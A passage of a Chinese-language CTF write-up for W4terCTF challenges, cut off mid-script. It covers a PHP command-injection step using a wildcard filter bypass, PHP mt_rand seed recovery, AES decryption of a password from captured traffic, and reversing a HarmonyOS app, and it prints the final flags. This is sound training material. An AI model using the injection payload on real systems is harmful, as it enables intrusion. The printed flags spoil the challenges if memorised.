data-src=\"微信图片_20250504140529.png\"\n                      alt=\"微信图片_20250504140529\"\n                ></p>\n<p>再配合通配符绕过一下</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/tmp/evil&amp;cmd=cat /tmp/f*lag2.txt</span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504140829.png\"\n                      alt=\"微信图片_20250504140829\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag_piece2: _The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!&#125;</span><br></pre></td></tr></table></figure></div>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;i5_pHp_The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!&#125;</span><br></pre></td></tr></table></figure></div>\n<h2 id=\"Front-End\"><a href=\"#Front-End\" class=\"headerlink\" title=\"Front End\"></a>Front End</h2><p>密码的web题</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155416.png\"\n                      alt=\"微信图片_20250504155416\"\n                ></p>\n<p>base64编码</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155524.png\"\n                      alt=\"微信图片_20250504155524\"\n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155559.png\"\n                      alt=\"微信图片_20250504155559\"\n                ></p>\n<p>打开 /hint.html</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155659.png\"\n                      alt=\"微信图片_20250504155659\"\n                ></p>\n<p>看到注释——JavaScript 混淆表达式。在控制台运行一下，得到encode.php</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155944.png\"\n                      alt=\"微信图片_20250504155944\"\n                ></p>\n<p>来到密码的部分</p>\n<p>根据</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504160243.png\"\n                      alt=\"微信图片_20250504160243\"\n                ></p>\n<p>这一部分的判断逻辑，如果变量 rand 等于0 就输出加密后的内容。</p>\n<p>根据 rand 的定义，传递参数 r = 1537101982</p>\n<p>得到了调用两次encrypt的加密结果：</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Encrypted: 253430495677694834376a30334d7643476e42466b36457a5672714649736d326b626d4c33666f4b6e546c7a324c583857396331543079 </span><br><span class=\"line\">Encrypted: 4f59355430674b38334631497243574c6b58394d46486d706d4249384b5a3230344d4c776d476a5431585a64774f5852747a507779</span><br></pre></td></tr></table></figure></div>\n<p>而在php语言中，mt_rand()生成随机数的方式一般是根据时间戳，如果固定了种子，调用mt_srand(seed)后，mt_rand()生成的随机数序列是不变的。可以得出第一次调用 mt_rand()得到的值等于r，即 1537101982。</p>\n<p>网上查阅资料可知，可从生成的随机数序列倒推种子。运行脚本后得到：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504160818.png\"\n                      alt=\"微信图片_20250504160818\"\n                ></p>\n<p>得出了几个满足条件的种子，正向地用这些种子生成随机数序列</p>\n<div class=\"code-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$seeds</span> = [<span class=\"number\">997887998</span>, <span class=\"number\">1741048634</span>, <span class=\"number\">2753486577</span>, <span class=\"number\">3026673652</span>, <span class=\"number\">4268323880</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"variable\">$seeds</span> <span class=\"keyword\">as</span> <span class=\"variable\">$seed</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Seed: <span class=\"subst\">$seed</span>\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"variable\">$seed</span>);  </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$rand1</span> = <span class=\"title function_ invoke__\">mt_rand</span>();  </span><br><span class=\"line\">    <span class=\"variable\">$rand2</span> = <span class=\"title function_ invoke__\">mt_rand</span>();  </span><br><span class=\"line\">    <span class=\"variable\">$rand3</span> = <span class=\"title function_ invoke__\">mt_rand</span>();  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;rand1: <span class=\"subst\">$rand1</span>, rand2: <span class=\"subst\">$rand2</span>, rand3: <span class=\"subst\">$rand3</span>\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$seed_enc</span> = <span class=\"variable\">$rand2</span> + <span class=\"variable\">$rand3</span> * <span class=\"number\">1000000000</span>;  <span class=\"comment\">//得到加密中需要使用的种子</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Seed Encrypted: <span class=\"subst\">$seed_enc</span>\\n&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 656981344086716842</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 139121407568507466</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 1604674039149147684</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 1782694585991376243</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 1520982203885732553</span></span><br></pre></td></tr></table></figure></div>\n<p>最后再根据原文的加密逻辑倒推flag：</p>\n<div class=\"code-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$chars</span>     = <span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$chars_map</span> = <span class=\"title function_ invoke__\">array_flip</span>(<span class=\"title function_ invoke__\">str_split</span>(<span class=\"variable\">$chars</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">decrypt</span>(<span class=\"params\"><span class=\"variable\">$encrypted_text</span>, <span class=\"variable\">$seed</span>, <span class=\"variable\">$chars</span>, <span class=\"variable\">$chars_map</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//$encrypted_text = urldecode($encrypted_text);//url解码</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$ch</span>  = <span class=\"variable\">$encrypted_text</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"variable\">$nh</span>  = <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$chars</span>, <span class=\"variable\">$ch</span>);<span class=\"comment\">//首字符的位置确定rand()产生的随机数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;nh: <span class=\"subst\">&#123;$nh&#125;</span>\\n&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$encrypted_body</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$encrypted_text</span>, <span class=\"number\">1</span>);<span class=\"comment\">//实际加密数据</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"comment\">//根据加密逻辑倒推</span></span><br><span class=\"line\">    <span class=\"variable\">$mdKey_full</span> = <span class=\"title function_ invoke__\">md5</span>((<span class=\"keyword\">string</span>)<span class=\"variable\">$seed</span> . <span class=\"variable\">$ch</span>);</span><br><span class=\"line\">    <span class=\"variable\">$start</span>      = <span class=\"variable\">$nh</span> % <span class=\"number\">8</span>;</span><br><span class=\"line\">    <span class=\"variable\">$length</span>     = <span class=\"variable\">$start</span> + <span class=\"number\">7</span>;           </span><br><span class=\"line\">    <span class=\"variable\">$mdKey</span>      = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$mdKey_full</span>, <span class=\"variable\">$start</span>, <span class=\"variable\">$length</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$k</span>    = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable\">$tmp</span>  = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$keyL</span> = <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$mdKey</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypted_body</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>       = <span class=\"variable\">$encrypted_body</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">        <span class=\"variable\">$k</span>       = <span class=\"variable\">$k</span> % <span class=\"variable\">$keyL</span>;</span><br><span class=\"line\">        <span class=\"variable\">$ci</span>      = <span class=\"variable\">$chars_map</span>[<span class=\"variable\">$c</span>];</span><br><span class=\"line\">        <span class=\"comment\">// j = (ci - nh - ord(mdKey[k])) mod 64</span></span><br><span class=\"line\">        <span class=\"variable\">$j</span>       = (<span class=\"variable\">$ci</span> - <span class=\"variable\">$nh</span> - <span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$mdKey</span>[<span class=\"variable\">$k</span>]) + <span class=\"number\">64</span>*<span class=\"number\">2</span>) % <span class=\"number\">64</span>;</span><br><span class=\"line\">        <span class=\"variable\">$tmp</span>    .= <span class=\"variable\">$chars</span>[<span class=\"variable\">$j</span>];</span><br><span class=\"line\">        <span class=\"variable\">$k</span>++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$seed</span>    = <span class=\"string\">&#x27;1782694585991376243&#x27;</span>;<span class=\"comment\">//手动更换计算得到的seed，wp为正确的seed</span></span><br><span class=\"line\"><span class=\"variable\">$cipher1</span> = <span class=\"string\">&quot;OY5T0gK83F1IrCWLkX9MFHmpmBI8KZ204MLwmGjT1XZdwOXRtzPwy&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//这里我已经先将加密的内容从转为转为了字节，并恢复了一些字符即url解码。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$encoded</span> = <span class=\"title function_ invoke__\">decrypt</span>(<span class=\"variable\">$cipher1</span>, <span class=\"variable\">$seed</span>, <span class=\"variable\">$chars</span>, <span class=\"variable\">$chars_map</span>);</span><br><span class=\"line\"><span class=\"variable\">$flag</span>    = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$encoded</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;[+] Decrypted flag: <span class=\"subst\">&#123;$flag&#125;</span>\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></div>\n<p>可成功解密flag</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504162719128.png\"\n                      alt=\"image-20250504162719128\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">W4terCTF&#123;A1b_fROn7EnD_kEep5_8rEwinG&#125;</span><br></pre></td></tr></table></figure></div>\n<h1 id=\"REVERSE\"><a href=\"#REVERSE\" class=\"headerlink\" title=\"REVERSE\"></a>REVERSE</h1><h2 id=\"网站管理员的登录密码\"><a href=\"#网站管理员的登录密码\" class=\"headerlink\" title=\"网站管理员的登录密码\"></a>网站管理员的登录密码</h2><p>根据提示需要找到<strong>成功登录</strong>的密码</p>\n<p>打开.pcapng，定位POST请求下的login流量包。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504163434.png\"\n                      alt=\"微信图片_20250504163434\"\n                ></p>\n<p>状态显示登陆成功，接下来只需要破解这段密码即可。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504163921288.png\"\n                      alt=\"image-20250504163921288\"\n                ></p>\n<p>找到了密码的加密方式，用一个密钥和一个初始向量，AES加密</p>\n<p>对应地写个解密脚本</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密密钥和初始向量</span></span><br><span class=\"line\">key = <span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span>)</span><br><span class=\"line\">iv = <span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密后的密文（Base64 编码）</span></span><br><span class=\"line\">encrypted_text = <span class=\"string\">&quot;gBjV3cE/UXEm7fXGXbQ4O7bXJEwi0y68SGNjkhuV2RW43lkkKm+xNQzpJDlfgCFOoAvOd0Ff1bg3Je4zbAAEdWpe8DmRdf5wH2F9vhAuDpg=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 Base64 编码的密文解码为字节</span></span><br><span class=\"line\">encrypted_bytes = base64.b64decode(encrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建 AES 解密器</span></span><br><span class=\"line\">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密并去除填充</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    decrypted_bytes = cipher.decrypt(encrypted_bytes)</span><br><span class=\"line\">    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密后的文本:&quot;</span>, decrypted_text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> ValueError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密失败:&quot;</span>, e)</span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504164403519.png\"\n                      alt=\"image-20250504164403519\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;Fr0N73Nd!_17&#x27;5_my_5ymM3trlC_3ncrYpt1On!!!!!&#125;</span><br></pre></td></tr></table></figure></div>\n<h2 id=\"和谐小APP\"><a href=\"#和谐小APP\" class=\"headerlink\" title=\"和谐小APP\"></a>和谐小APP</h2><p>参考了这篇博客：<a class=\"link\"   href=\"https://www.52pojie.cn/thread-1973595-1-1.html\" >鸿蒙逆向 - SHCTF - Android？Harmony！题解 - 吾爱破解 - 52pojie.cn<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n<p>先将.hap文件改为.zip后缀解压</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504164803915.png\"\n                      alt=\"image-20250504164803915\" style=\"zoom:50%;\" \n                ></p>\n<p>找到.abc文件，用abc反编译工具打开。在 entryability 下定位到 W4terCTF：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504165220376.png\"\n                      alt=\"image-20250504165220376\"\n                ></p>\n<p>这段反编译的结果大致是说，如果 trim == “flag”，trim2 ==”W4terCTF{…}”，就会触发彩蛋。而彩蛋是从“libentry.so”中导入的guessWhat函数在 输入是trim2，种子是20250428 的条件下生成的。</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">orz = import &#123; default as orz &#125; from &quot;@normalized:Y&amp;&amp;&amp;libentry.so&amp;&quot;;</span><br><span class=\"line\">obj4.message = orz.guessWhat(trim2, 20250428);</span><br></pre></td></tr></table></figure></div>\n<p>那么就定位到 libentry.so 文件。用 IDA 打开，定位到guesswhat函数</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504170855720.png\"\n                      alt=\"image-20250504170855720\"\n                ></p>\n<p>找到了函数的实际入口地址，F5一下，反编译代码主要逻辑如下：</p>\n<div class=\"code-container\" data-rel=\"Js\"><figure class=\"iseeu highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">napi_get_value_string_utf8</span>(a1, v18, s1, 128LL, v13);<span class=\"comment\">//字符串</span></span><br><span class=\"line\"><span class=\"title function_\">napi_get_value_double</span>(a1, *((_QWORD *)&amp;v18 + <span class=\"number\">1</span>), &amp;v12);<span class=\"comment\">//数字</span></span><br><span class=\"line\">                      </span><br><span class=\"line\"><span class=\"comment\">//对传入的两个参数进行一些变换</span></span><br><span class=\"line\">v4 = <span class=\"number\">5</span> * (int)v12;</span><br><span class=\"line\">  v5 = <span class=\"number\">15</span> * (int)v12;</span><br><span class=\"line\">  v6 = <span class=\"number\">20</span> * (int)v12;</span><br><span class=\"line\">  v7 = <span class=\"number\">10</span> * (int)v12;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = 0LL; ; i += 20LL )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i) ^= v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">0x77</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i + <span class=\"number\">5</span>) ^= v4 + v3;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i + <span class=\"number\">10</span>) ^= v7 + v3;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i + <span class=\"number\">15</span>) ^= v5 + v3;</span><br><span class=\"line\">    v3 += v6;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//最后判断变换后的变量是否与target相等</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_\">bcmp</span>(s1, &amp;target, <span class=\"number\">0x80</span>))</span><br><span class=\"line\">    v8 = &amp;unk_910;  <span class=\"comment\">// 成功提示</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    v8 = &amp;unk_91C;  <span class=\"comment\">// 失败提示</span></span><br></pre></td></tr></table></figure></div>\n<p>所以下面就是要去找到 target</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504172003259.png\"\n                      alt=\"image-20250504172003259\"\n                ></p>\n<p>提取出target的所有字节，并基于上面的变换逻辑恢复出flag即可</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\">target_bytes = <span class=\"built_in\">bytes</span>([</span><br><span class=\"line\">    <span class=\"number\">0x57</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xA8</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x7D</span>, <span class=\"number\">0x57</span>,</span><br><span class=\"line\">    <span class=\"number\">0x10</span>, <span class=\"number\">0xBD</span>, <span class=\"number\">0x5F</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0xA1</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x44</span>,</span><br><span class=\"line\">    <span class=\"number\">0xE2</span>, <span class=\"number\">0x95</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xAF</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x45</span>,</span><br><span class=\"line\">    <span class=\"number\">0x57</span>, <span class=\"number\">0xA8</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x71</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x55</span>,</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0x93</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x70</span>,</span><br><span class=\"line\">    <span class=\"number\">0xC8</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x99</span>, <span class=\"number\">0xD5</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x10</span>, <span class=\"number\">0xD2</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x68</span>, <span class=\"number\">0xCA</span>, <span class=\"number\">0x7D</span>, <span class=\"number\">0x54</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x94</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x86</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0xC0</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>, <span class=\"number\">0xBB</span>, <span class=\"number\">0xA1</span>, <span 